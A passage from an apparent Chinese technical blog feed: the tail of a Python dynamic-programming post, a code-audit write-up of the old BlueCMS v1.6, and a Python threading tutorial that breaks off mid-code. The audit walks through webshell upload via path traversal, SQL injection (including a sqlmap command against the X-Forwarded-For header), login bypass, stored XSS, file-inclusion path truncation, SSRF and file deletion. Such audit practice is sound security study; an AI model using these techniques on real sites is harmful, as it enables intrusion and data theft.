0：啥都不做，1：插入，2：替换，3：删除    dp[(0, 0)] &#x3D; 0    a[(0, 0)] &#x3D; 0    for i in range(1, m + 1):        dp[(i, 0)] &#x3D; i        a[(i, 0)] &#x3D; 3    for i in range(1, n + 1):        dp[(0, i)] &#x3D; i        a[(0, i)] &#x3D; 1    for i in range(1, m + 1):        for j in range(1, n + 1):            if s1[i - 1] &#x3D;&#x3D; s2[j - 1]:                dp[(i, j)] &#x3D; dp[(i - 1, j - 1)]  # 不动，也就是相同直接跳过 0                a[(i, j)] &#x3D; 0            else:                dp[(i, j)] &#x3D; min(dp[(i, j - 1)] + 1,  # 插入 1                                 dp[(i - 1, j - 1)] + 1,  # 替换 2                                 dp[(i - 1, j)] + 1)  # 删除 3            if dp[(i, j)] &#x3D;&#x3D; dp[(i, j - 1)] + 1:                a[(i, j)] &#x3D; 1            elif dp[(i, j)] &#x3D;&#x3D; dp[(i - 1, j - 1)] + 1:                a[(i, j)] &#x3D; 2            elif dp[(i, j)] &#x3D;&#x3D; dp[(i - 1, j)] + 1:                a[(i, j)] &#x3D; 3    for i in range(n + 1):        for j in range(m + 1):            print(a[(j, i)], end&#x3D;&quot;&quot;)        print()    return dp[(m, n)]if __name__ &#x3D;&#x3D; &quot;__main__&quot;:    print(minDistance(&quot;apple&quot;, &quot;add&quot;))</code></pre><p>以上代码将输出：</p><pre class="language-none"><code class="language-none">0333331033331122221112224</code></pre><p>从后面往前推就行，0,2代表对角（跳过/替换），1代表向上（插入），3代表向左（删除）</p><p>寻找到0的最佳捷径就OK</p><h3 id="高楼扔鸡蛋"><a href="#高楼扔鸡蛋" class="headerlink" title="高楼扔鸡蛋"></a>高楼扔鸡蛋</h3><p>题目：</p><p>目前有一栋1到<code>N</code>共<code>N</code>层的楼，然后给你<code>K</code>鸡蛋（<code>K</code>至少为1），现在确定这栋楼存在楼层<code>0&lt;=F&lt;=N</code>,在这层楼将鸡蛋扔下去鸡蛋<strong>恰好没有碎</strong>（高于<code>F</code>的楼层都会碎，低于<code>F</code>的楼层都不会碎），现在问，最坏的情况下，你至少要扔多少次鸡蛋，才能确定这个楼层<code>F</code>？</p><h4 id="带备忘录的递归解法-3"><a href="#带备忘录的递归解法-3" class="headerlink" title="带备忘录的递归解法"></a>带备忘录的递归解法</h4><pre class="language-python" data-language="python"><code class="language-python">def main(K, N):  # K个鸡蛋,N层楼    memo &#x3D; dict()    if K &#x3D;&#x3D; 0:        return N    if N &#x3D;&#x3D; 0:        return 0    if (K, N) in memo:        return memo[(K, N)]    res &#x3D; float(&quot;INF&quot;)    for i in range(1, N + 1):        res &#x3D; min(res, max(main(K - 1, i - 1), main(K, N - i)) + 1)  # 在max最坏的情况下，求min最优解，main(K - 1, i - 1)表示碎了，main(K, N - i)表示没碎    memo[(K, N)] &#x3D; res    return resif __name__ &#x3D;&#x3D; &quot;__main__&quot;:    print(main(1, 100))</code></pre><h4 id="二分法优化"><a href="#二分法优化" class="headerlink" title="二分法优化"></a>二分法优化</h4><pre class="language-python" data-language="python"><code class="language-python">def main(K, N):  # K个鸡蛋,N层楼    memo &#x3D; dict()    if K &#x3D;&#x3D; 0:        return N    if N &#x3D;&#x3D; 0:        return 0    if (K, N) in memo:        return memo[(K, N)]    res &#x3D; float(&quot;INF&quot;)    lo &#x3D; 1    hi &#x3D; N    while lo &lt;&#x3D; hi:        mid &#x3D; (lo + hi) &#x2F;&#x2F; 2        broken &#x3D; main(K - 1, mid - 1)  # 碎        not_broken &#x3D; main(K, N - mid)  # 没碎        # res &#x3D; min(max(碎, 没碎) + 1)        if broken &gt; not_broken:            hi &#x3D; mid - 1            res &#x3D; min(res, broken + 1)        else:            lo &#x3D; mid + 1            res &#x3D; min(res, not_broken + 1)    memo[(K, N)] &#x3D; res    return resif __name__ &#x3D;&#x3D; &quot;__main__&quot;:    print(main(1, 100))</code></pre><p>未完待续。。。</p>]]></content>
      
      
      <categories>
          
          <category> 算法 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> python </tag>
            
            <tag> 算法 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>BlueCMS代码审计</title>
      <link href="/posts/b7c1e15e/"/>
      <url>/posts/b7c1e15e/</url>
      
        <content type="html"><![CDATA[<p>“BlueCMS——第一款免费开源的专业地方门户系统，专注于地方门户的CMS！”  广告是这么打的</p><p>BlueCMS v1.6 sp1，一个很老的CMS了，2010年的，上面的漏洞也很多，作为一个代码审计萌新的我，开始来拿这个练练手还是不错的</p><a id="more"></a><h3 id="GetShell"><a href="#GetShell" class="headerlink" title="GetShell"></a>GetShell</h3><p>在后台有一个模板管理的功能，可以编辑前端htm文件</p><p><img src="https://gitee.com/Extrader/blogimage/raw/master/image/BlueCMS%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/image-20200417101051793.png" alt loading="lazy"></p><p>点击编辑抓包</p><p><img src="https://gitee.com/Extrader/blogimage/raw/master/image/BlueCMS%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/image-20200417101241645.png" alt loading="lazy"></p><p>可以看到包含了文件，于是我们尝试修改编辑的文件，改为<code>../../ann.php</code>，放包后如下，可以修改</p><p><img src="https://gitee.com/Extrader/blogimage/raw/master/image/BlueCMS%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/image-20200417101419641.png" alt loading="lazy"></p><p>随后直接写马连接即可，源码如下：</p><p><img src="https://gitee.com/Extrader/blogimage/raw/master/image/BlueCMS%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/image-20200417101729886.png" alt loading="lazy"></p><h3 id="SQL注入"><a href="#SQL注入" class="headerlink" title="SQL注入"></a>SQL注入</h3><h4 id="X-Forwarded-For头注入"><a href="#X-Forwarded-For头注入" class="headerlink" title="X-Forwarded-For头注入"></a>X-Forwarded-For头注入</h4><p>首先看到留言系统后台代码</p><p><img src="https://gitee.com/Extrader/blogimage/raw/master/image/BlueCMS%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/image-20200415164807809.png" alt loading="lazy"></p><p>网站习惯性的把用户留言时的ip保存下来，在看看getip()这个函数怎么写的</p><p><img src="https://gitee.com/Extrader/blogimage/raw/master/image/BlueCMS%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/image-20200415165228100.png" alt loading="lazy"></p><p>getenv()函数获取环境变量的值</p><ul><li>第一个HTTP_CLIENT_IP这个环境变量没有成标准，很多服务器完全没法获取</li><li>第二个X-Forwarded-For 这个东西可以通过HTTP请求头来修改。</li></ul><p>X-Forwarded-For明显可以伪造</p><p>抓包手工延时注入：</p><p><img src="https://gitee.com/Extrader/blogimage/raw/master/image/BlueCMS%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/image-20200415165848020.png" alt loading="lazy"></p><p>然后写脚本跑就可以了</p><p>sqlmap跑数据库：<code>python sqlmap.py -r 1.txt --dbs --batch --headers=&quot;X-Forwarded-For:1*&quot;</code></p><p>可以把数据全跑出来</p><p><img src="https://gitee.com/Extrader/blogimage/raw/master/image/BlueCMS%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/image-20200415171800746.png" alt loading="lazy"></p><h4 id="首页登录界面SQL注入"><a href="#首页登录界面SQL注入" class="headerlink" title="首页登录界面SQL注入"></a>首页登录界面SQL注入</h4><p>先随便注册一个用户名为root的账号，然后在抓包使用万能密码即可登录任意用户</p><p><img src="https://gitee.com/Extrader/blogimage/raw/master/image/BlueCMS%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/image-20200415134357459.png" alt loading="lazy"></p><p>再来看看源码中是怎么写的</p><p><img src="https://gitee.com/Extrader/blogimage/raw/master/image/BlueCMS%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/image-20200415134551779.png" alt loading="lazy"></p><p>只限制了管理员组的不能从前台登录，参数没经过任何的过滤。。。</p><h4 id="注册界面SQL注入"><a href="#注册界面SQL注入" class="headerlink" title="注册界面SQL注入"></a>注册界面SQL注入</h4><p>既然是注册界面就看肯定有插入数据到数据库中的操作，直接看源码</p><p><img src="https://gitee.com/Extrader/blogimage/raw/master/image/BlueCMS%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/image-20200414102814136.png" alt loading="lazy"></p><p>简单的进行了用户和密码的检测，但并起不到实际的作用，于是在email处尝试进行报错注入，单引号闭合的时候能够成功插入到数据库中并没有报错，于是推测使用了魔术方法对用户的输入进行了转义，而sql语句编码方法使用的gbk编码，于是在单引号前面加上%df构成宽字节注入</p><p><img src="https://gitee.com/Extrader/blogimage/raw/master/image/BlueCMS%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/image-20200414104343110.png" alt loading="lazy"></p><p>成功报错但并没有显示出错误信息，查看源代码</p><p><img src="https://gitee.com/Extrader/blogimage/raw/master/image/BlueCMS%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/image-2020041411035197.png" alt loading="lazy"></p><p>似乎只会报sql语法错误，而我们报错注入使用的是XPATH上的语法错误，所以并不会显示出来，于是尝试盲注试试，尝试后视乎并没有执行成功，而是报了错误，原因不明，后面再研究</p><p>另外此处还有一个sql注入漏洞，可以插入多行用户数据，并且在email出嵌入sql语句，用户名单引号用十六进制代替</p><p><img src="https://gitee.com/Extrader/blogimage/raw/master/image/BlueCMS%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/image-20200414121232230.png" alt loading="lazy"></p><p>可见成功执行注入，在数据库中成功执行了语句</p><p><img src="https://gitee.com/Extrader/blogimage/raw/master/image/BlueCMS%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/image-20200414121433047.png" alt loading="lazy"></p><h4 id="管理登录界面SQL注入"><a href="#管理登录界面SQL注入" class="headerlink" title="管理登录界面SQL注入"></a>管理登录界面SQL注入</h4><p>如下图，万能密码直接进了</p><p><img src="https://gitee.com/Extrader/blogimage/raw/master/image/BlueCMS%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/image-20200416150916773.png" alt loading="lazy"></p><p>源码，无过滤</p><p><img src="https://gitee.com/Extrader/blogimage/raw/master/image/BlueCMS%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/image-20200416151154990.png" alt loading="lazy"></p><h4 id="ad-idSQL注入"><a href="#ad-idSQL注入" class="headerlink" title="ad_idSQL注入"></a>ad_idSQL注入</h4><p>直接看源码</p><p><img src="https://gitee.com/Extrader/blogimage/raw/master/image/BlueCMS%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/image-20200416153522230.png" alt loading="lazy"></p><p>应该存在联合查询注入，随后在第七个字段找到注入点，成功获取数据库名，随后再接着查表列就行了</p><p><img src="https://gitee.com/Extrader/blogimage/raw/master/image/BlueCMS%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/image-20200416153652959.png" alt loading="lazy"></p><h3 id="XSS"><a href="#XSS" class="headerlink" title="XSS"></a>XSS</h3><h4 id="个人资料存储型xss"><a href="#个人资料存储型xss" class="headerlink" title="个人资料存储型xss"></a>个人资料存储型xss</h4><p><img src="https://gitee.com/Extrader/blogimage/raw/master/image/BlueCMS%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/image-20200415161529680.png" alt loading="lazy"></p><p>随后在个人界面和管理员用户界面完美弹窗，再看看数据库中的资料</p><p><img src="https://gitee.com/Extrader/blogimage/raw/master/image/BlueCMS%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/image-20200415161646983.png" alt loading="lazy"></p><p>email和msn都嵌入了script代码，为啥其它的没用？因为表字段的长度只有那么长</p><p><img src="https://gitee.com/Extrader/blogimage/raw/master/image/BlueCMS%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/image-20200415161908634.png" alt loading="lazy"></p><p>再看看代码</p><p><img src="https://gitee.com/Extrader/blogimage/raw/master/image/BlueCMS%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/image-20200415162022292.png" alt loading="lazy"></p><p>同样未经过过滤，这里还存在sql注入漏洞，就不写了。</p><h4 id="注册界面存储型xss"><a href="#注册界面存储型xss" class="headerlink" title="注册界面存储型xss"></a>注册界面存储型xss</h4><p>注册界面的验证有部分是放在前端进行验证的，也就是用js进行验证，可我们都知道，前端验证并不可靠，真正的验证应该做在后端才行，就比如这里的邮箱验证就放在前端</p><p><img src="https://gitee.com/Extrader/blogimage/raw/master/image/BlueCMS%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/image-20200414100621671.png" alt loading="lazy"></p><p>于是我们直接抓包绕过，并在email中注入恶意代码</p><p><img src="https://gitee.com/Extrader/blogimage/raw/master/image/BlueCMS%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/image-2020041410074329.png" alt loading="lazy"></p><p>随后只要前端能够看得到该用户的邮箱，就会执行该恶意代码，就比如管理员的用户列表界面</p><img src="https://gitee.com/Extrader/blogimage/raw/master/image/BlueCMS代码审计/image-20200414101006315.png" style="zoom:80%;" loading="lazy"><h4 id="发布新闻页面存储型XSS"><a href="#发布新闻页面存储型XSS" class="headerlink" title="发布新闻页面存储型XSS"></a>发布新闻页面存储型XSS</h4><p>先看下源码：</p><p><img src="https://gitee.com/Extrader/blogimage/raw/master/image/BlueCMS%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/image-20200416113747952.png" alt loading="lazy"></p><p>content参数使用的是<code>filter_data</code>函数进行处理，而这个函数并没有过滤<code>img</code>标签，于是可以利用进行xss攻击</p><p><img src="https://gitee.com/Extrader/blogimage/raw/master/image/BlueCMS%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/image-20200416114042972.png" alt loading="lazy"></p><p>随后在新闻页面成功弹窗</p><h3 id="敏感信息泄露"><a href="#敏感信息泄露" class="headerlink" title="敏感信息泄露"></a>敏感信息泄露</h3><h4 id="备份信息泄露"><a href="#备份信息泄露" class="headerlink" title="备份信息泄露"></a>备份信息泄露</h4><p>管理员界面可以进行数据库备份，备份完后的数据放在这个目录下，并且命名规则为使用当日日期，可以尝试爆破地址</p><p><img src="https://gitee.com/Extrader/blogimage/raw/master/image/BlueCMS%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/image-20200415173114792.png" alt loading="lazy"></p><p>访问即可下载sql文件，其中有用户的个人信息，密码经过了md5加密，弱密码的话直接就可以加密开了</p><h3 id="文件包含"><a href="#文件包含" class="headerlink" title="文件包含"></a>文件包含</h3><p>既然有文件包含漏洞自然少不了那四个<a href="https://www.extrader.top/2020/03/20/%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E6%BC%8F%E6%B4%9E%E5%B0%8F%E7%BB%93/">文件包含</a>的操作，所以在找文件包含漏洞的时候就需要对这几个操作格外留意</p><h4 id="支付表单文件包含"><a href="#支付表单文件包含" class="headerlink" title="支付表单文件包含"></a>支付表单文件包含</h4><p>先在user.php中找到有<code>include</code>操作的代码，如下：</p><p><img src="https://gitee.com/Extrader/blogimage/raw/master/image/BlueCMS%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/image-20200416085302539.png" alt loading="lazy"></p><p>可以看到这里我们可以post一个pay参数，且pay参数我们可控，既然有文件包含了，自然就要找到文件上传的地方来包含这个文件来达到getshell的目的，在我们修改个人资料的界面就有上传头像的操作，于是我们上传图片马</p><p><img src="https://gitee.com/Extrader/blogimage/raw/master/image/BlueCMS%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/image-20200416085806794.png" alt loading="lazy"></p><p>得到路径，而这个文件包含操作在后面还加上了一个<code>/index.php</code>，这里就要根据为Windows下的文件最大路径来截取了，前提条件是php版本要小于<code>5.2.8</code>，Windows下目录最大长度为256字节，超出的部分会被丢弃，于是在提交act=pay的表单处提交一个<code>pay=../../data/upload/face_pic/15869440930.jpg......(超出256个字节)</code>，即可达到效果，由于我这没配php5.2.8的版本就不演示了</p><h3 id="SSRF"><a href="#SSRF" class="headerlink" title="SSRF"></a>SSRF</h3><h4 id="修改用户头像处SSRF"><a href="#修改用户头像处SSRF" class="headerlink" title="修改用户头像处SSRF"></a>修改用户头像处SSRF</h4><p>源码：</p><p><img src="https://gitee.com/Extrader/blogimage/raw/master/image/BlueCMS%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/image-20200416120117255.png" alt loading="lazy"></p><p>这段代码是用来防止<code>http://</code>和<code>https://</code>链接的，但是使用的是弱比价，如果<code>strpos</code>返回的值为0，那么<code>0!=false</code>返回的是<code>false</code>即可绕过判断访问内网资源</p><h3 id="其它"><a href="#其它" class="headerlink" title="其它"></a>其它</h3><h4 id="install无限安装"><a href="#install无限安装" class="headerlink" title="install无限安装"></a>install无限安装</h4><p>install目录是用来安装这个CMS的，但是在经过一次安装后再进入install系统并不会提示已经安装过或者要身份验证，于是就会造成无需任何提交就可以重新安装这个网站的风险，尽管管理员页面有提示（开发人员也有意识到），但如果使用者并没有在意就会造成极大的危害</p><p><img src="https://gitee.com/Extrader/blogimage/raw/master/image/BlueCMS%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/image-20200413184943343.png" alt loading="lazy"></p><h4 id="爆破用户名"><a href="#爆破用户名" class="headerlink" title="爆破用户名"></a>爆破用户名</h4><p>在输入用户名之后系统会自动发一个包到数据库去验证，如图所示</p><p><img src="https://gitee.com/Extrader/blogimage/raw/master/image/BlueCMS%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/image-20200413190358504.png" alt loading="lazy"></p><p>而这个查询并没有次数限制，于是就可以利用这个数据包传入的user_name值来爆破用户名，造成身份信息泄露</p><p><img src="https://gitee.com/Extrader/blogimage/raw/master/image/BlueCMS%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/image-20200413185326945.png" alt loading="lazy"></p><h4 id="任意文件删除"><a href="#任意文件删除" class="headerlink" title="任意文件删除"></a>任意文件删除</h4><p>在修改会员的个人资料页面存在此漏洞，源码：</p><p><img src="https://gitee.com/Extrader/blogimage/raw/master/image/BlueCMS%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/image-20200416120945046.png" alt loading="lazy"></p><p><code>face_pic3</code>可控，当<code>face_pic1</code>为空时即可删除<code>face_pic3</code>文件，如下</p><p><img src="https://gitee.com/Extrader/blogimage/raw/master/image/BlueCMS%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/image-20200416121706429.png" alt loading="lazy"></p><p>可删除网站根目录下的1.txt文件</p><h3 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h3><ul><li><a href="https://xz.aliyun.com/t/7074">https://xz.aliyun.com/t/7074</a></li><li><a href="https://www.anquanke.com/post/id/178545">https://www.anquanke.com/post/id/178545</a></li><li><a href="https://blog.csdn.net/WiCaTcRaZy/article/details/80444699">https://blog.csdn.net/WiCaTcRaZy/article/details/80444699</a></li></ul>]]></content>
      
      
      <categories>
          
          <category> 源码审计 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> CMS </tag>
            
            <tag> 代码审计 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Python-多线程编程</title>
      <link href="/posts/64be7bf2/"/>
      <url>/posts/64be7bf2/</url>
      
        <content type="html"><![CDATA[<h3 id="threading模块"><a href="#threading模块" class="headerlink" title="threading模块"></a>threading模块</h3><p>可用对象列表</p><table><thead><tr><th align="center">对象</th><th align="center">描述</th></tr></thead><tbody><tr><td align="center">Thread</td><td align="center">表示一个执行线程的对象</td></tr><tr><td align="center">Lock</td><td align="center">锁原语对象</td></tr><tr><td align="center">RLock</td><td align="center">可重入锁对象，使单一的线程可以(再次)获得已持有的做(递归锁)</td></tr><tr><td align="center">Condition</td><td align="center">条件变量对象，使得一个线程等待另一个线程满足的特定的”条件”，比如改变状态或某个数据值</td></tr><tr><td align="center">Event</td><td align="center">条件变量的通用版本，任意数量的线程等待某个事件的发生，在该事件发生后所有的线程将被激活</td></tr><tr><td align="center">Semaphore</td><td align="center">为线程间共享的有限资源提供了一个”计数器”，如果没有可用资源时会被阻塞</td></tr><tr><td align="center">BoundedSemaphore</td><td align="center">与Semaphore相似，不过它要在运行前等待一段时间</td></tr><tr><td align="center">Timer</td><td align="center">与Thread相似，不过它要在运行前等待一段时间</td></tr><tr><td align="center">Barrier</td><td align="center">创建一个”障碍”，必须达到指定数量的线程后才可以继续</td></tr></tbody></table><h3 id="Thread类"><a href="#Thread类" class="headerlink" title="Thread类"></a>Thread类</h3><p>Thread类是threading模块主要的执行对象</p><p><strong>Thread对象数据属性</strong></p><table><thead><tr><th align="center">属性</th><th align="center">描述</th></tr></thead><tbody><tr><td align="center">name</td><td align="center">线程名</td></tr><tr><td align="center">ident</td><td align="center">线程的标识符</td></tr><tr><td align="center">daemon</td><td align="center">布尔标志，表示这个线程是否是守护线程</td></tr></tbody></table><p><strong>Thread对象方法</strong></p><table><thead><tr><th align="center">属性</th><th align="center">描述</th></tr></thead><tbody><tr><td align="center"><code>__init__(group=None,target=None,name=None,args=(),kwargs=&#123;&#125;,verbose=None,daemon=None)</code></td><td align="center">实例化一个线程对象，需要有一个可调用的target，以及其参数args或kwargs</td></tr><tr><td align="center">start()</td><td align="center">开始执行该线程</td></tr><tr><td align="center">run()</td><td align="center">定义线程功能的方法(通常在子类中被应用开发者重写)</td></tr><tr><td align="center">join(timeout=None)</td><td align="center">直至启动的线程终止之前一直挂起；除非给出了timeout(秒)，否则会一直阻塞</td></tr></tbody></table><p>下面看一段可创建多线程的代码</p><pre class="language-python" data-language="python"><code class="language-python">import threadingfrom time import sleep, ctimeloops &#x3D; [4, 2]def loop(nloop, nsec):    print(&quot;start loop&quot;, nloop, &quot;at :&quot;, ctime())    sleep(nsec)    print(&quot;loop&quot;, nloop, &quot;done at :&quot;, ctime())def main():    print(&quot;starting at:&quot;, ctime())    threads &#x3D; []    nloops &#x3D; range(len(loops))    for i in nloops:        t &#x3D; threading.Thread(target&#x3D;loop, args&#x3D;(i,loops[i]))  #target&#x3D;需要线程去执行的方法名   args&#x3D;线程执行方法接收的参数，该属性是一个元组，如果只有一个参数也需要在末尾加逗号        threads.append(t)    for i in nloops:        print(threads[i])        threads[i].start() #线程等待启动    for i in nloops:        threads[i].join()  # 线程等待，主线程不会等待子线程执行完毕再结束自身，可使用Thread类的join()方法来让所有子线程执行完毕以后，主线程再关闭        print(threads[i])    print(&quot;all DONE at:&quot;,ctime())if __name__ &#x3D;&#x3D; &quot;__main__&quot;:    main()</code></pre><p>运行结果如下：</p><p><img src="https://gitee.com/Extrader/blogimage/raw/master/image/Python-%E5%A4%9A%E7%BA%BF%E7%A8%8B%E7%BC%96%E7%A8%8B/image-20200408205329302.png" alt loading="lazy"></p><p>当然以上也可以创建多个线程，下面使用可调用的类来实现：</p><pre class="language-python" data-language="python"><code class="language-python">import threadingfrom time import ctime, sleeploops &#x3D; [4, 2]class ThreadFunc(threading.Thread):    def __init__(self, func, args):        threading.Thread.__init__(self)        self.func &#x3D; func        self.args &#x3D; args    def run(self):          #重写run方法,定义线程功能        self.func(*self.args)def loop(nloop, nsec):    print(&#39;start loop&#39;, nloop, &#39;at :&#39;, ctime())    sleep(nsec)    print(&#39;loop&#39;, nloop, &#39;done at :&#39;, ctime())def main():    print(&#39;starting at :&#39;, ctime())    threads &#x3D; []    nloops &#x3D; range(len(loops))    for i in nloops:        t &#x3D; ThreadFunc(loop, (i, loops[i]))        threads.append(t)    for i in nloops:        threads[i].start()    for i in nloops:        threads[i].join()    print(&#39;all DONE at :&#39;,ctime())if __name__ &#x3D;&#x3D; &quot;__main__&quot;:    main()</code></pre><p>效果和上面的一样，随后我们将其功能存储为一个独立的模块（myThread.py）：</p><pre class="language-python" data-language="python"><code class="language-python">import threadingfrom time import ctimeclass MyThread(threading.Thread):    def __init__(self,func,args,name &#x3D; &quot;&quot;):        self.name &#x3D; name        self.func &#x3D; func        self.args &#x3D; args    def getResult(self):        return self.res  #将结果保存后通过getResult方法获取返回值    def run(self):        print(&quot;starting&quot;, self.name, ctime())        self.res &#x3D; self.func(*self.args)        print(self.name, &quot;finished at :&quot;, ctime())</code></pre><h3 id="斐波那契，阶乘与累加"><a href="#斐波那契，阶乘与累加" class="headerlink" title="斐波那契，阶乘与累加"></a>斐波那契，阶乘与累加</h3><pre class="language-python" data-language="python"><code class="language-python">from myThread import MyThreadfrom time import ctime, sleepdef Fib(x):    sleep(0.005)    if x &lt; 3: return 1    return (Fib(x - 1) + Fib(x - 2))def Fac(x):    sleep(0.1)    if x &lt; 2: return 1    return (x * Fac(x - 1))def Sum(x):    sleep(0.1)    if x &lt; 2: return 1    return (x + Sum(x - 1))funcs &#x3D; [Fib, Fac, Sum]n &#x3D; 8def main():    nfuncs &#x3D; range(len(funcs))    for i in nfuncs:        print(&quot;starting&quot;, funcs[i].__name__, &quot;at :&quot;, ctime())        print(funcs[i](n))        print(funcs[i].__name__, &quot;finished at :&quot;, ctime())    print(&quot;\n *** MULTIPLE THREADS&quot;)    threads &#x3D; []    for i in nfuncs:        t &#x3D; MyThread(funcs[i], (n,), funcs[i].__name__)        threads.append(t)    for i in nfuncs:        threads[i].start()    for i in nfuncs:        threads[i].join()        print(threads[i].getResult())    print(&quot;all DONE&quot;)if __name__ &#x3D;&#x3D; &quot;__main__&quot;:    main()</code></pre><p>运行结果如下，可见多线程处理的效果</p><p><img src="https://gitee.com/Extrader/blogimage/raw/master/image/Python-%E5%A4%9A%E7%BA%BF%E7%A8%8B%E7%BC%96%E7%A8%8B/image-20200410104130911.png" alt loading="lazy"></p><h3 id="锁示例"><a href="#锁示例" class="headerlink" title="锁示例"></a>锁示例</h3><pre class="language-python" data-language="python"><code class="language-python">from atexit import registerfrom random import randrangefrom threading import Thread , Lock, current_threadfrom time import ctime, sleepclass CleanOutputSet(set):    def __str__(self):  #当使用print输出对象的时候，若定义了__str__(self)方法，打印对象时就会从这个方法中打印出return的字符串数据        return &quot;, &quot;.join(x for x in self)#表示将self中每个元素（除最后一个）后加上, 分离形成字符串后返回lock &#x3D; Lock()   #创建一个锁对象loops &#x3D; (randrange(2,5) for x in range(randrange(3,7)))#此行表示随机选取2-5的数字随机选3-7次remaining &#x3D; CleanOutputSet()def loop(nsec):    myname &#x3D; current_thread().name  #返回当前Thread对象的名字    lock.acquire()          #加锁    remaining.add(myname)   #add方法，如果不在集合中则添加    print(&quot;[&#123;&#125;] Started &#123;&#125;&quot;.format(ctime(),myname))    #print(&quot;    (remaining: &#123;&#125;)&quot;.format(remaining or &quot;NONE&quot;))    lock.release()          #释放    sleep(nsec)    lock.acquire()    remaining.remove(myname)    print(&quot;[&#123;&#125;] Competed &#123;&#125; (&#123;&#125; secs)&quot;.format(ctime(),myname,nsec))    print(&quot;    (remaining: &#123;&#125;)&quot;.format(remaining or &quot;NONE&quot;))    lock.release()def main():    for pause in loops:        Thread(target&#x3D;loop, args&#x3D;(pause,)).start()@register   #通过装饰器使用register,atexit模块使用register函数用于在 python 解释器中注册一个退出函数，这个函数在解释器正常终止时自动执行def _atexit():     print(&quot;all DONE at :&#123;&#125;&quot;.format(ctime()))if __name__ &#x3D;&#x3D; &quot;__main__&quot;:    main()</code></pre><p>输出结果之一如下：</p><p><img src="https://gitee.com/Extrader/blogimage/raw/master/image/Python-%E5%A4%9A%E7%BA%BF%E7%A8%8B%E7%BC%96%E7%A8%8B/image-20200410215119133.png" alt loading="lazy"></p><p>I/O和访问相同的数据结构都属于临界区，因此需要多个锁来防止多个线程同时进入临界区</p><h3 id="信号量示例"><a href="#信号量示例" class="headerlink" title="信号量示例"></a>信号量示例</h3><pre class="language-python" data-language="python"><code class="language-python">from atexit import registerfrom random import randrangefrom threading import BoundedSemaphore, Lock, Threadfrom time import ctime, sleeplock &#x3D; Lock()MAX &#x3D; 5candytray &#x3D; BoundedSemaphore(MAX)def refill():    lock.acquire()    print(&quot;Refilling candy...&quot;,end&#x3D;&quot;&quot;)    try:        candytray.release()  #释放信号量，使内部计数器增加一，可以唤醒等待的线程    except ValueError:        print(&quot;full, skipping&quot;)    else:        print(&quot;OK  &quot;,end&#x3D;&quot;&quot;)        print(&quot;Remaining :&#123;&#125;&quot;.format(candytray._value))    lock.release()def buy():    lock.acquire()    print(&quot;Buying candy...&quot;,end&#x3D;&quot;&quot;)    if candytray.acquire(False):   # 获取一个信号量，如果内部计数器大于零，则将其减一并立即返回True。如果为零，返回False        print(&quot;OK  &quot;,end&#x3D;&quot;&quot;)        print(&quot;Remaining :&#123;&#125;&quot;.format(candytray._value))    else:        print(&quot;empty, skipping&quot;)    lock.release()def producer(loops):    for i in range(loops):        refill()        sleep(randrange(3))def consumer(loops):    for i in range(loops):        buy()        sleep(randrange(3))def main():    print(&quot;starting at :&#123;&#125;&quot;.format(ctime()))    nloops &#x3D; randrange(2,6)    print(&quot;THE CANDY MACHINE (full with &#123;&#125;)!&quot;.format(MAX))    Thread(target&#x3D;consumer, args&#x3D;(randrange(nloops, nloops + MAX + 2),)).start()    Thread(target&#x3D;producer, args&#x3D;(nloops,)).start()@registerdef _atexit():    print(&quot;all DONE at :&#123;&#125;&quot;.format(ctime()))if __name__ &#x3D;&#x3D; &quot;__main__&quot;:    